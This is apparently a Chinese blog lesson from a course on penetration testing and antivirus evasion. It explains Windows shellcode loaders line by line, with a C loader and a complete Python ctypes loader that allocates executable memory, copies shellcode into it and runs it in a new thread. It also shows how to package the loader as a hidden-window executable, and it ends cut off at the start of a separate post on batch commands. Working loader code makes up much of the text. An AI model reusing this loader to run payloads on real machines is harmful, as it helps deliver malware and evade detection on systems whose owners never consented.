comment是#pragma下的一个子命令，使用注释方式引入库或<a href="https://baike.baidu.com/item/%E7%BC%96%E8%AF%91/1258343?fromModule=lemma_inlink">编译</a>目录。</p><p>#pragma comment是一个编译器指令，指示Visual C ++在生成的目标文件中留下注释。链接器在处理对象文件时可以读取该注释。</p><p>#pragma comment(lib, libname) 告诉链接器将’libname’库添加到库依赖关系列表中，就好像您已经将它添加到项目属性中一样 Linker-&gt;Input-&gt;Additional dependencies</p><blockquote><p>请参阅MSDN上的<a href="http://msdn.microsoft.com/en-us/library/7f0aews7(v=vs.120).aspx">#pragma-comment</a></p></blockquote><h3 id="ShowWindow-和GetConsoleWindow"><a href="#ShowWindow-和GetConsoleWindow" class="headerlink" title="ShowWindow()和GetConsoleWindow()"></a>ShowWindow()和GetConsoleWindow()</h3><p>ShowWindow()该函数可以控制窗口状态，GetConsoleWindow()获取到我们所需要控制的目的窗口的句柄</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ShowWindow</span>(<span class="built_in">GetConsoleWindow</span>(), SW_HIDE);</span><br></pre></td></tr></table></figure><p>GetConsoleWindow 函数 检索与调用进程关联的控制台所使用的窗口句柄</p><blockquote><p><a href="https://docs.microsoft.com/zh-cn/windows/console/getconsolewindow">https://docs.microsoft.com/zh-cn/windows/console/getconsolewindow</a></p></blockquote><p>ShowWindow 这个函数设置窗口的可视状态</p><blockquote><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow</a></p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数原型：</span></span><br><span class="line"><span class="function">BOOL <span class="title">ShowWindow</span><span class="params">( </span></span></span><br><span class="line"><span class="params"><span class="function">    HWND hWnd, <span class="comment">// 指定要设定窗口的句柄 </span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span> nCmdShow <span class="comment">// 指定窗口显示状态 </span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>参数：hWnd 指定要设定窗口的句柄</li><li>参数： nCmdShow 指定了如何显示窗口。</li></ul><blockquote><p>它必须是下列值之一：  </p><ul><li>SW_HIDE               隐藏窗口并将活动状态传递给其它窗口。 </li><li>SW_MINIMIZE           最小化窗口并激活系统列表中的顶层窗口。 </li><li>SW_RESTORE            激活并显示窗口。如果窗口是最小化或最大化的，Windows恢复其原来的大小和位置。  </li><li>SW_SHOW               激活窗口并以其当前的大小和位置显示。 </li><li>SW_SHOWMAXIMIZED      激活窗口并显示为最大化窗口。 </li><li>SW_SHOWMINIMIZED      激活窗口并显示为图标。  </li><li>SW_SHOWMINNOACTIVE    将窗口显示为图标。当前活动的窗口将保持活动状态。 </li><li>SW_SHOWNA             按照当前状态显示窗口。当前活动的窗口将保持活动状态。 </li><li>SW_SHOWNOACTIVATE     按窗口最近的大小和位置显示。当前活动的窗口将保持活动状态。</li><li>SW_SHOWNORMAL         激活并显示窗口。如果窗口是最小化或最大化的，则Windows恢复它原来的大小和位置。</li></ul></blockquote><h3 id="无符号字节数组"><a href="#无符号字节数组" class="headerlink" title="无符号字节数组"></a>无符号字节数组</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned char buf[] = &quot;\xfc\x48\x83\xe4\xf0\xe8.....&quot;;</span><br></pre></td></tr></table></figure><p>无符号字节数组，给全部数组元素赋值，定义数组时可以不给出数组长度。</p><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义一个返回类型为 int  整型的 main()  函数， main  是任何程序执行的起点</p><h3 id="无类型指针"><a href="#无类型指针" class="headerlink" title="无类型指针"></a>无类型指针</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  void *Memory; //等价于PVOID，无类型指针</span></span><br><span class="line">    PVOID Memory = <span class="literal">NULL</span>; <span class="comment">// P表示指针，PVOID表示 void * 无类型指针</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">声明一个无类型指针，可以采用以上两种方法</span><br><span class="line">void *Memory; 和 PVOID Memory = NULL;</span><br><span class="line"> P表示指针，PVOID表示 void * 无类型指针</span><br></pre></td></tr></table></figure><blockquote><p>C指针详解：</p><ul><li><a href="http://c.biancheng.net/view/228.html">http://c.biancheng.net/view/228.html</a> </li><li><a href="https://www.runoob.com/w3cnote/c-pointer-detail.html">https://www.runoob.com/w3cnote/c-pointer-detail.html</a></li></ul></blockquote><h3 id="VirtualAlloc"><a href="#VirtualAlloc" class="headerlink" title="VirtualAlloc"></a>VirtualAlloc</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Memory = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br></pre></td></tr></table></figure><ol><li>简介</li></ol><p>简单来说就是分配内存的~~</p><p>此函数在调用进程的<strong>虚拟地址空间</strong>中保留或提交页面区域， VirtualAlloc  分配的内存被初始化为零</p><p>VirtualAlloc是win32的 <strong>api</strong>  函数，是用来申请动态内存的，动态内存我们可以通俗的理解为，主动式保护内存，可以根据我们自己决定是否存在;</p><ol start="2"><li>函数原型</li></ol><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">VirtualAlloc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD flAllocationType,</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD flProtect</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><ol start="3"><li>参数</li></ol><ul><li>IpAddress：指向要分配内存的指定起始地址。一般为null，由系统自己分配</li></ul><blockquote><p>长指针。如果此参数为NULL，则由系统确定将区域分配到的位置。</p></blockquote><ul><li><p>dwSize：指定分配内存的大小（以字节为单位）。将此参数设置为0是错误的。</p></li><li><p>flAllocationType：指定分配内存的类型</p></li></ul><table><thead><tr><th>值</th><th>描述</th></tr></thead><tbody><tr><td>MEM_COMMIT</td><td>在内存中或磁盘上的页面文件中为页面的指定区域分配物理存储。尝试提交已提交的页面不会导致功能失败。这意味着可以提交一系列已提交或已取消提交的页面，而不必担心失败。</td></tr><tr><td>MEM_RESERVE</td><td>保留进程的虚拟地址空间范围，而不分配物理存储。保留范围在释放之前不能被任何其他分配操作（例如malloc和LocalAlloc函数）使用。保留的页面可以在对VirtualAlloc函数的后续调用中提交。</td></tr><tr><td>MEM_RESET</td><td>不支持。</td></tr><tr><td>MEM_TOP_DOWN</td><td>在可能的最高地址处分配内存。Windows Mobile中将忽略此标志。</td></tr></tbody></table><ul><li>flProtect：访问这块分配内存的权限。</li></ul><table><thead><tr><th>值</th><th>描述</th></tr></thead><tbody><tr><td>PAGE_EXECUTE</td><td>启用对页面的提交区域的执行访问。</td></tr><tr><td>PAGE_EXECUTE_READ</td><td>启用对页面的提交区域的执行和读取访问。尝试写入提交的区域会导致访问冲突。</td></tr><tr><td>PAGE_EXECUTE_READWRITE</td><td>启用对页面的提交区域的执行，读取和写入访问权限。</td></tr><tr><td>PAGE_GUARD</td><td>该区域中的页面将成为保护页面。</td></tr><tr><td>PAGE_NOACCESS</td><td>禁用对页面的提交区域的所有访问。尝试从提交的区域读取，写入或执行该操作会导致访问冲突异常，称为通用保护（GP）故障。</td></tr><tr><td>PAGE_NOCACHE</td><td>不允许缓存页面的提交区域。物理内存的硬件属性应指定为无高速缓存。</td></tr><tr><td>PAGE_READONLY</td><td>启用对页面的提交区域的读取访问。尝试写入提交的区域会导致访问冲突。如果系统区分只读访问和执行访问，则在提交区域执行代码的尝试将导致访问冲突。</td></tr><tr><td>PAGE_READWRITE</td><td>启用对页面的提交区域的读写访问。</td></tr></tbody></table><ol start="4"><li>返回值</li></ol><p>返回页面分配区域的基址表示成功。NULL表示失败。要获取扩展的错误信息，请调用 GetLastError 。</p><h4 id="申请虚拟内存"><a href="#申请虚拟内存" class="headerlink" title="申请虚拟内存"></a>申请虚拟内存</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *pMem = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">4096</span>, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);</span><br></pre></td></tr></table></figure><h4 id="释放虚拟内存。"><a href="#释放虚拟内存。" class="headerlink" title="释放虚拟内存。"></a>释放虚拟内存。</h4><blockquote><p>注意：</p><ol><li>第三个参数一定要用 MEM_RELEASE ,而不能用 MEM_DECOMMIT ;</li><li>第二个参数一定要用0。</li></ol></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VirtualFree(pMem, 0, MEM_RELEASE);</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://docs.microsoft.com/zh-cn/previous-versions/aa908768(v=msdn.10)">https://docs.microsoft.com/zh-cn/previous-versions/aa908768(v=msdn.10)</a><br><a href="https://blog.csdn.net/weixin_41143631/article/details/87808495">https://blog.csdn.net/weixin_41143631/article/details/87808495</a></p></blockquote><h3 id="memcpy"><a href="#memcpy" class="headerlink" title="memcpy()"></a>memcpy()</h3><p>把shellcode写入内存</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(Memory, buf, <span class="built_in">sizeof</span>(buf));</span><br></pre></td></tr></table></figure><p>函数声明：</p><p>C 库函数 memcpy  从存储区 str2 复制 n 个字节到存储区 str1。</p><p>返回值：该函数返回一个指向目标存储区 str1 的指针。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *<span class="title">memcpy</span><span class="params">(<span class="type">void</span> *str1, <span class="type">const</span> <span class="type">void</span> *str2, <span class="type">size_t</span> n)</span></span></span><br></pre></td></tr></table></figure><h3 id="void-Memory"><a href="#void-Memory" class="headerlink" title="((void(*)())Memory)();"></a>((void(*)())Memory)();</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">((<span class="built_in">void</span>(*)())Memory)();</span><br></pre></td></tr></table></figure><p>理解 ((void(*)())exec)();</p><h4 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h4><p>如果变量 fp  是一个函数指针，那么如何调用 fp  所指向的函数呢？调用方法如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">(*fp)();<span class="comment">// 标准的调用方法</span></span><br><span class="line"><span class="built_in">fp</span>();   <span class="comment">// 简写的调用方法，因为ANSI C标准允许程序员将上式简写</span></span><br></pre></td></tr></table></figure><p>因为 fp  是一个函数指针，那么 *fp  就是该指针所指向的函数，所以 (*fp)()  就是调用该函数的方式。</p><p>这里用一段代码来理解一下函数指针怎么用：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Max</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span></span>;  <span class="comment">//函数声明</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">int</span> (*p)(<span class="type">int</span>, <span class="type">int</span>);  <span class="comment">//定义一个函数指针</span></span><br><span class="line">    <span class="type">int</span> a, b, c, d;</span><br><span class="line">    p = Max;  <span class="comment">//把函数Max赋给指针变量p, 使p指向Max函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;please enter a and b:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">    c = <span class="built_in">p</span>(a, b);    <span class="comment">// 通过函数指针调用Max函数</span></span><br><span class="line">    d = (*p)(a, b); <span class="comment">// 这样调用也行</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %d\nb = %d\nmax = %d,%d\n&quot;</span>, a, b, c,d);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Max</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>  <span class="comment">//定义Max函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> z;</span><br><span class="line">    <span class="keyword">if</span> (x &gt; y)&#123;</span><br><span class="line">        z = x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        z = y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> z;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">please enter a and b:3 4</span><br><span class="line">a = 3</span><br><span class="line">b = 4</span><br><span class="line">max = 4</span><br></pre></td></tr></table></figure><p>上面那段代码中， int (<em>p)(int, int); ，我们定义 p  是一个指向返回值为 int  类型的且有两个 int  类型参数的函数的指针。</em></p><p>现在我们搞简单点，如果 fp  是一个指向返回值为 void  类型的函数的指针，那么 (*fp)() 的值应为void ， fp 的声明如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void (*fp)();</span><br></pre></td></tr></table></figure><h4 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h4><p>当我们知道如何声明一个给定类型的变量，那么该类型的类型转换符就很容易得到了：把声明中的变量名和声明结尾的分号去掉，再将剩余的部分用括号括起来就行。那么上面的 fp 的声明 void (*fp)();的类型转换符就可以得出来了，如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">(<span class="built_in">void</span> (*)())</span><br><span class="line"><span class="comment">//表示一个 指向返回值为void类型的函数的指针</span></span><br></pre></td></tr></table></figure><p>到此为止，我们理解那段最终目标的代码所需要的前置知识已经全部复习完毕。</p><p>因此 ((void(*)())Memory)();  就可以拆开理解了</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">(     (<span class="built_in">void</span>(*)())Memory    )();</span><br><span class="line"><span class="comment">// 先看中间部分，将Memory进行强制类型转化成一个函数指针（指向返回值为void类型的函数的指针）</span></span><br><span class="line"><span class="comment">// 此时 Memory 已经是一个函数指针了，现在回忆一下，刚刚我们是怎么调用 函数指针所指向的函数的呢？</span></span><br><span class="line"><span class="comment">// 没错，就是(*Memory)(); 或者直接使用简写 Memory();</span></span><br></pre></td></tr></table></figure><blockquote><ul><li><a href="https://www.runoob.com/w3cnote/c-pointer-detail.html">C 指针详解</a></li><li><a href="http://c.biancheng.net/view/228.html">函数指针及其定义和用法，C语言函数指针详解</a></li></ul></blockquote><h1 id="shellcodeLoder-Python（学完python再来看）"><a href="#shellcodeLoder-Python（学完python再来看）" class="headerlink" title="shellcodeLoder-Python（学完python再来看）"></a>shellcodeLoder-Python（学完python再来看）</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> ctypes<span class="comment">#主要用到此库</span></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(<span class="string">&quot;shellcode&quot;</span>)</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment"># 1. 通过 VirtualAlloc 申请内存区域</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"><span class="comment"># 2. 通过 RtlMoveMemory 把shellcode复制到申请的内存中</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line"> ctypes.c_uint64(ptr), </span><br><span class="line"> buf, </span><br><span class="line"> ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 3. 通过 CreateThread 创建线程执行shellcode</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_uint64(ptr),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 4. 通过  WaitForSingleObject 检测线程对象的状态，为了让线程一直处于运行状态</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>执行python的代码需要有python环境，但是呢，我们可以直接打包可执行程序~~~这样限制就少了一点</p><p>pyinstaller打包python代码为exe：</p><blockquote><ol><li>安装pyinstaller</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install pyinstaller</span><br></pre></td></tr></table></figure><ol><li>打包python代码</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyinstaller.exe -F -w .\sc.py</span><br></pre></td></tr></table></figure></blockquote><p>需要注意的是~~同样这样打包生成的exe是无法免杀的<del>我们同样可以定位查杀特征进行混淆绕过</del>—同样下节课会讲到</p><h2 id="Python内存加载原理"><a href="#Python内存加载原理" class="headerlink" title="Python内存加载原理"></a>Python内存加载原理</h2><p>大部分脚本语言加载 shellcode 其实都是通过 c 的 ffi 去调用操作系统的api，因此只要知道 c 是如何加载 shellcode，那么其它的其实就都一样了。</p><ol><li>申请一片拥有可读可写可执行的内存区域</li><li>将 shellcode 载入到申请的内存区域</li><li>跳转到 shellcode 首地址开始执行</li></ol><h2 id="Ctypes库"><a href="#Ctypes库" class="headerlink" title="Ctypes库"></a>Ctypes库</h2><blockquote><p><a href="https://docs.python.org/zh-cn/3.7/library/ctypes.html">https://docs.python.org/zh-cn/3.7/library/ctypes.html</a></p></blockquote><p>ctypes  是 Python 的外部函数库。它提供了与 C 兼容的数据类型，并允许调用 DLL 或共享库中的函数。可使用该模块以纯 Python 形式对这些库进行封装。</p><ul><li>载入动态连接库</li></ul><p>ctypes  导出了 cdll  对象，在 Windows 系统中还导出了 windll  和 oledll  对象用于载入动态连接库。</p><p>通过操作这些对象的属性，你可以载入外部的动态链接库。</p><h2 id="转换数据类型"><a href="#转换数据类型" class="headerlink" title="转换数据类型"></a>转换数据类型</h2><p>因为后面要把shellcode载入内存，所以将shellcode转换为字节类型</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(<span class="string">&quot;shellcode&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="设置VirtualAlloc返回类型"><a href="#设置VirtualAlloc返回类型" class="headerlink" title="设置VirtualAlloc返回类型"></a>设置VirtualAlloc返回类型</h2><p>要能在64位系统上运行，必须使用 restype  函数设置 VirtualAlloc  返回类型为 ctypes.c_unit64 ，否则默认是 32 位</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br></pre></td></tr></table></figure><h2 id="VirtualAlloc-函数申请内存"><a href="#VirtualAlloc-函数申请内存" class="headerlink" title="VirtualAlloc 函数申请内存"></a>VirtualAlloc 函数申请内存</h2><p>函数在调用进程的虚拟地址空间中保留或申请内存区域，VirtualAlloc分配的内存被初始化为零。python中采用ctypes调用VirtualAlloc 函数</p><ul><li>函数原型</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LPVOID VirtualAlloc(</span><br><span class="line">  LPVOID lpAddress,         #指向要分配内存的指定起始地址</span><br><span class="line">  DWORD dwSize,             #指定分配内存的大小</span><br><span class="line">  DWORD flAllocationType,   #指定分配内存的类型</span><br><span class="line">  DWORD flProtect           #该内存的初始保护属性</span><br><span class="line">);</span><br></pre></td></tr></table></figure><ul><li>方法</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#解释：和上面c的函数原型很类似</span></span><br><span class="line"><span class="comment">#ctypes.c_int(0)：</span></span><br><span class="line">如果此参数为NULL，则系统确定内存分配将区域的位置，按<span class="number">64</span>-KB向上取整。</span><br><span class="line"><span class="comment">#ctypes.c_int(len(shellcode))：</span></span><br><span class="line">要分配或者保留的区域的大小，以字节为单位。</span><br><span class="line"><span class="comment">#ctypes.c_int(0x3000)====&gt;c里面的MEM_COMMIT | MEM_RESERVE</span></span><br><span class="line">分配类型值为 <span class="number">0x3000</span> ，是 MEM_COMMIT(<span class="number">0x1000</span>) 和 MEM_RESERVE(<span class="number">0x2000</span>)类型的合并</span><br><span class="line"><span class="comment">#ctypes.c_int(0x40)：</span></span><br><span class="line">访问类型值为 <span class="number">0x40</span> ，访问类型为 PAGE_EXECUTE_READWRITE ,此区域可读写执行。</span><br></pre></td></tr></table></figure><blockquote><p>更多参考：<a href="https://baike.baidu.com/item/VirtualAlloc/1606859?fr=aladdin">https://baike.baidu.com/item/VirtualAlloc/1606859?fr=aladdin</a></p></blockquote><h2 id="将Shellcode载入内存"><a href="#将Shellcode载入内存" class="headerlink" title="将Shellcode载入内存"></a>将Shellcode载入内存</h2><p>调用 RtlMoveMemory  函数从指定内存中复制内容至另一内存</p><ul><li>函数原型（类似前面c中的memcpy()）</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">RtlMoveMemory(</span><br><span class="line">    Destination,    <span class="comment">#指向要移动目的地址的指针</span></span><br><span class="line">    Source,         <span class="comment">#指向要复制的内存地址的指针</span></span><br><span class="line">    Length          <span class="comment">#指定复制内容的字节数</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><ul><li>方法</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line"> ctypes.c_uint64(ptr),</span><br><span class="line"> buf,</span><br><span class="line"> ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="CreateThread创建线程（开始执行）"><a href="#CreateThread创建线程（开始执行）" class="headerlink" title="CreateThread创建线程（开始执行）"></a>CreateThread创建线程（开始执行）</h2><p>创建一个线程从shellcode载入位置首地址开始执行。调用 CreateThread  将在主线程的基础上创建一个新线程</p><ul><li>函数原型</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">HANDLE CreateThread(</span><br><span class="line">LPSECURITY_ATTRIBUTES lpThreadAttributes,   <span class="comment">#线程安全属性</span></span><br><span class="line">SIZE_T dwStackSize,                         <span class="comment">#设置初始栈的大小，以字节为单位</span></span><br><span class="line">LPTHREAD_START_ROUTINE lpStartAddress,      <span class="comment">#指向线程函数的指针</span></span><br><span class="line">LPVOID lpParameter,                         <span class="comment">#向线程函数传递的参数</span></span><br><span class="line">DWORD dwCreationFlags,                      <span class="comment">#线程创建属性</span></span><br><span class="line">LPDWORD lpThreadId                          <span class="comment">#保存新线程的id</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li>方法</li></ul><p>创建一个线程从shellcode放置位置开始执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(0),                        #NULL，使用默认安全性</span><br><span class="line">    ctypes.c_int(0),                        #默认将使用与调用该函数的线程相同的栈空间大小  </span><br><span class="line">    ctypes.c_uint64(ptr),                   #定位到申请的内存所在的位置 </span><br><span class="line">    ctypes.c_int(0),                        #NULL，不需传递参数</span><br><span class="line">    ctypes.c_int(0),                        #属性为0，线程创建后立即激活</span><br><span class="line">    ctypes.pointer(ctypes.c_int(0))         #不想返回线程ID,设置值为NULL</span><br><span class="line">)</span><br></pre></td></tr></table></figure><blockquote><p>更多参考：<a href="https://baike.baidu.com/item/CreateThread/8222652?fr=aladdin">https://baike.baidu.com/item/CreateThread/8222652?fr=aladdin</a></p></blockquote><h2 id="等待创建的线程运行结束"><a href="#等待创建的线程运行结束" class="headerlink" title="等待创建的线程运行结束"></a>等待创建的线程运行结束</h2><p>上线结束后 我们才能退出，不然该程序执行完就会退出~~~~</p><p>调用 WaitForSingleObject  函数用来检测线程的状态</p><ul><li>函数原型</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DWORD WINAPI WaitForSingleObject(</span><br><span class="line">    __<span class="keyword">in</span> HANDLE hHandle,        <span class="comment">#对象句柄，可以指定一系列的对象</span></span><br><span class="line">    __<span class="keyword">in</span> DWORD dwMilliseconds   <span class="comment">#定时时间间隔，单位为毫秒</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>dwMilliseconds  如果指定一个非零值，函数处于等待状态直到 Handle （创建线程时返回的线程句柄）标记的对象被触发，或者时间到了。</p><p>为了保持创建的线程一直运行，因此将时间设置为负数，让函数一直处于等待状态，而不会结束运行。</p><ul><li>方法</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><blockquote><p>更多参考：<a href="https://baike.baidu.com/item/WaitForSingleObject/3534838?fr=aladdin">https://baike.baidu.com/item/WaitForSingleObject/3534838?fr=aladdin</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 免杀 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows DOS命令\批处理脚本学习</title>
      <link href="/%E7%9F%A5%E8%AF%86/Windows/Windows-DOS%E5%91%BD%E4%BB%A4-%E6%89%B9%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0.html"/>
      <url>/%E7%9F%A5%E8%AF%86/Windows/Windows-DOS%E5%91%BD%E4%BB%A4-%E6%89%B9%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>bat脚本就是DOS批处理脚本，就是将一些列DOS命令按照一定顺序排列而形成的集合，运行在windows命令行环境上。</p><h1 id="简单常见Window-shell知识"><a href="#简单常见Window-shell知识" class="headerlink" title="简单常见Window-shell知识"></a>简单常见Window-shell知识</h1><h2 id="基本常识"><a href="#基本常识" class="headerlink" title="基本常识"></a>基本常识</h2><blockquote><ol><li>如果它是系统命令，则执行相应的命令；</li><li>如果不是，将从环境变量Path列举的路径中搜索与其同名的程序，如果匹配到就执行相应的程序；</li><li>如果没匹配到，就判断它是否是一个合法的程序文件路径（可能是相对路径或者绝对路径），如果是就执行相应的程序；</li><li>如果以上匹配全部失败，命令解释程序应该就会提示你该命令或程序不存在。这一般是命令名称敲错了、或者没有添加相应的Path，又或者要执行程序的路径搞错了；</li><li>无论执行的是系统命令还是某个程序，后面其他的块都会作为该命令或程序的参数传入，这些参数的合法性和作用则由相应的命令或程序来决定。</li></ol></blockquote><blockquote><ul><li><p><strong>系统命令：</strong>命令解释程序预定义的命令，在cmd中输入命令help，就会显示出所有系统命令和它们的简介；PowerShell预定义的命令就更多更复杂，但大体能兼容cmd的常用系统命令；</p></li><li><p><strong>环境变量Path：</strong>可以简单理解为系统的一个设置项，里面包含了一条条路径，作为常用程序的搜索位置。将常用程序所在的目录添加进来，就能在命令行中直接以程序名执行该程序而无需输入完整路径；</p></li><li><p><strong>程序文件：</strong>Windows中就是后缀名.exe的文件。在命令行中如果不会引起歧义，程序文件的.exe后缀可以省略。</p></li></ul></blockquote><h2 id="命令行执行多条命令"><a href="#命令行执行多条命令" class="headerlink" title="命令行执行多条命令"></a>命令行执行多条命令</h2><blockquote><p>使用<code>&amp; &amp;&amp; ||</code>分隔开</p><ul><li>用&amp;隔开，用法是前后命令不管是可否运行都会运行下去</li><li>用&amp;&amp;隔开，用法是前面的命令运行成功才运行后面的命令</li><li>用||隔开，用法是前面的命令运行失败才运行后面的命令</li></ul></blockquote><h2 id="windows系统常用命令"><a href="#windows系统常用命令" class="headerlink" title="windows系统常用命令"></a>windows系统常用命令</h2><h3 